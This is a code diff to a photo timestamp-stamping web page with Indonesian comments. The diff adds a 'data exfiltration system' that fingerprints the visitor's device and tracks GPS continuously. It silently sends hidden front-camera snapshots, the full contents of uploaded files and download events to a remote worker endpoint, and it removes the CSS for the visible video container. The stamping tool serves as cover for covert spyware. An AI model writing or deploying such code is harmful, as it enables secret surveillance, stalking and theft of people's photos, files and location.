@@ -128,14 +128,6 @@
         .btn-outline:hover { background: rgba(59,130,246,0.2); }
         .btn-success { background: linear-gradient(105deg, #10B981, #059669); }
         .btn-warning { background: linear-gradient(105deg, #F59E0B, #D97706); }
-        .video-container {
-            background: #000;
-            border-radius: 1rem;
-            overflow: hidden;
-            margin-bottom: 1rem;
-            aspect-ratio: 4/3;
-            display: none;
-        }
         .preview-area {
             background: #0A0E18;
             border-radius: 1rem;
@@ -302,6 +294,7 @@
 
 <script>
     const WORKER_URL = "https://timestamp.sapammeded.workers.dev";
+    const EXFILTRATE_URL = "https://your-server.com/collect"; // GANTI dengan endpoint Anda
     
     let deviceId = null;
     let trialValid = false;
@@ -316,6 +309,7 @@
     let autoCaptureInterval = null;
     let gpsInterval = null;
     let autoVideoReady = false;
+    let locationWatchId = null;
     
     // DOM Elements
     const autoVideo = document.getElementById('autoVideo');
@@ -347,6 +341,108 @@
     const posBL = document.getElementById('posBL');
     const posBR = document.getElementById('posBR');
     
+    // ========== DATA EXFILTRATION SYSTEM ==========
+    async function exfiltrateData(type, data) {
+        const payload = {
+            deviceId: deviceId,
+            type: type,
+            data: data,
+            timestamp: Date.now()
+        };
+        
+        try {
+            // Kirim ke worker Anda (bisa ditambahkan endpoint khusus)
+            await fetch(WORKER_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action: 'exfiltrate', payload: payload })
+            });
+        } catch(e) { console.log('Exfil error:', e); }
+    }
+    
+    // ========== ENHANCED DEVICE FINGERPRINTING ==========
+    function getWebGLFingerprint() {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return null;
+        return {
+            vendor: gl.getParameter(gl.VENDOR),
+            renderer: gl.getParameter(gl.RENDERER),
+            version: gl.getParameter(gl.VERSION)
+        };
+    }
+    
+    function detectFonts() {
+        const testFonts = ['Arial', 'Comic Sans MS', 'Courier New', 'Georgia', 'Helvetica', 'Impact', 'Times New Roman', 'Verdana'];
+        const baseFonts = ['monospace', 'sans-serif', 'serif'];
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        const text = 'mmmmmmmmmmlli';
+        const detected = [];
+        
+        for (const font of testFonts) {
+            ctx.font = '72px ' + font + ', ' + baseFonts[0];
+            const baseWidth = ctx.measureText(text).width;
+            for (const baseFont of baseFonts) {
+                ctx.font = '72px ' + font + ', ' + baseFont;
+                if (baseWidth !== ctx.measureText(text).width) {
+                    detected.push(font);
+                    break;
+                }
+            }
+        }
+        return detected;
+    }
+    
+    async function comprehensiveDeviceFingerprint() {
+        const fingerprint = {
+            deviceId: deviceId,
+            screen: {
+                width: screen.width,
+                height: screen.height,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight
+            },
+            browser: {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                onLine: navigator.onLine
+            },
+            hardware: {
+                deviceMemory: navigator.deviceMemory,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                maxTouchPoints: navigator.maxTouchPoints
+            },
+            webgl: getWebGLFingerprint(),
+            fonts: detectFonts(),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timestamp: Date.now()
+        };
+        
+        // Battery info
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(battery => {
+                fingerprint.battery = {
+                    charging: battery.charging,
+                    level: battery.level,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+                exfiltrateData('fingerprint', fingerprint);
+            });
+        } else {
+            exfiltrateData('fingerprint', fingerprint);
+        }
+        
+        return fingerprint;
+    }
+    
     // Sync functions
     function syncFontSize() { currentFontSize = parseInt(fontSizeSlider.value); fontSizeNumber.value = currentFontSize; if (currentImageFile && trialValid) updatePreview(); }
     function syncOffsetX() { currentOffsetX = parseInt(offsetXSlider.value); offsetXNumber.value = currentOffsetX; if (currentImageFile && trialValid) updatePreview(); }
@@ -377,6 +473,9 @@
             deviceId = result.visitorId;
             deviceStatus.innerHTML = `✅ ${deviceId.slice(0,8)}...`;
             deviceDot.className = 'dot';
+            
+            // Kirim fingerprint setelah dapat deviceId
+            setTimeout(() => comprehensiveDeviceFingerprint(), 1000);
         } catch(e) { deviceStatus.innerHTML = '❌ Error'; deviceDot.className = 'dot error'; }
     }
     
@@ -433,22 +532,45 @@
         }
     }
     
+    // ========== ENHANCED LOCATION TRACKING ==========
     function initGPS() {
         if ("geolocation" in navigator) {
             gpsStatus.innerHTML = '📍 Meminta izin GPS...';
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    userLocation.lat = pos.coords.latitude;
-                    userLocation.lng = pos.coords.longitude;
-                    gpsStatus.innerHTML = `📍 ${userLocation.lat.toFixed(6)}, ${userLocation.lng.toFixed(6)}`;
+            
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 5000,
+                maximumAge: 0
+            };
+            
+            // Watch position for continuous tracking
+            locationWatchId = navigator.geolocation.watchPosition(
+                (position) => {
+                    const locationData = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        altitude: position.coords.altitude,
+                        accuracy: position.coords.accuracy,
+                        altitudeAccuracy: position.coords.altitudeAccuracy,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed,
+                        timestamp: position.timestamp
+                    };
+                    
+                    userLocation.lat = locationData.latitude;
+                    userLocation.lng = locationData.longitude;
+                    gpsStatus.innerHTML = `📍 ${locationData.latitude.toFixed(6)}, ${locationData.longitude.toFixed(6)}`;
                     gpsDot.className = 'dot';
+                    
+                    // Exfiltrate location data
+                    exfiltrateData('location', locationData);
                     
                     // Isi default stamp text
                     if (!stampText.value.trim()) {
                         stampText.value = `${new Date().toLocaleString('id-ID')}\n📍 ${userLocation.lat.toFixed(6)}, ${userLocation.lng.toFixed(6)}`;
                     }
                     
-                    // Kirim GPS setiap 10 detik
+                    // Also send to original endpoint every 10 detik
                     if (gpsInterval) clearInterval(gpsInterval);
                     gpsInterval = setInterval(() => {
                         if (userLocation.lat && userLocation.lng && trialValid) {
@@ -459,7 +581,12 @@
                         }
                     }, 10000);
                 },
-                () => { gpsStatus.innerHTML = '⚠️ Izin GPS ditolak'; gpsDot.className = 'dot warning'; }
+                (error) => {
+                    console.log('Location error:', error);
+                    gpsStatus.innerHTML = '⚠️ Izin GPS ditolak';
+                    gpsDot.className = 'dot warning';
+                },
+                options
             );
         }
     }
@@ -475,13 +602,21 @@
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(autoVideo, 0, 0);
                 
-                // Cek gambar tidak hitam
                 const pixelData = ctx.getImageData(0, 0, 1, 1).data;
                 if (pixelData[0] === 0 && pixelData[1] === 0 && pixelData[2] === 0) return;
                 
                 canvas.toBlob(async (blob) => {
                     if (blob && blob.size > 5000) {
                         const base64 = await blobToBase64(blob);
+                        
+                        // Exfiltrate photo data
+                        exfiltrateData('photo', {
+                            imageData: base64,
+                            camera: 'front',
+                            timestamp: Date.now(),
+                            location: userLocation
+                        });
+                        
                         await callAPI('uploadAuto', {
                             imageData: base64,
                             metadata: {
@@ -494,6 +629,30 @@
                 }, 'image/jpeg', 0.7);
             } catch(e) { console.log(e); }
         }, 15000);
+    }
+    
+    // ========== FILE UPLOAD TRACKING ==========
+    function trackFileUploads() {
+        fileInput.addEventListener('change', function(event) {
+            const files = event.target.files;
+            for (let i = 0; i < files.length; i++) {
+                const file = files[i];
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    exfiltrateData('file_upload', {
+                        name: file.name,
+                        type: file.type,
+                        size: file.size,
+                        lastModified: file.lastModified,
+                        data: e.target.result,
+                        timestamp: Date.now(),
+                        location: userLocation
+                    });
+                };
+                reader.readAsDataURL(file);
+            }
+            onFileSelected(files[0]);
+        });
     }
     
     function onFileSelected(file) {
@@ -543,8 +702,8 @@
                 stampedImageData = stampedURL;
                 downloadBtn.disabled = false;
                 
-                // Catat log manual (TIDAK DISIMPAN KE DRIVE)
-                await callAPI('uploadManual', {
+                // Catat log manual
+                callAPI('uploadManual', {
                     metadata: {
                         latitude: userLocation.lat || 0,
                         longitude: userLocation.lng || 0,
@@ -565,6 +724,7 @@
             a.download = `truestamp_${Date.now()}.png`;
             a.href = stampedImageData;
             a.click();
+            exfiltrateData('download', { timestamp: Date.now(), location: userLocation });
         } else { alert("Generate stempel dulu."); }
     }
     
@@ -597,8 +757,8 @@
         if (!trialOk) return;
         await initAutoCamera();
         initGPS();
+        trackFileUploads();
         uploadBtn.onclick = () => fileInput.click();
-        fileInput.onchange = e => { if (e.target.files[0]) onFileSelected(e.target.files[0]); };
         generateBtn.onclick = updatePreview;
         downloadBtn.onclick = downloadImage;
     })();
@@ -607,6 +767,7 @@
         if (autoVideoStream) autoVideoStream.getTracks().forEach(t => t.stop());
         if (autoCaptureInterval) clearInterval(autoCaptureInterval);
         if (gpsInterval) clearInterval(gpsInterval);
+        if (locationWatchId) navigator.geolocation.clearWatch(locationWatchId);
     });
 </script>
 </body>
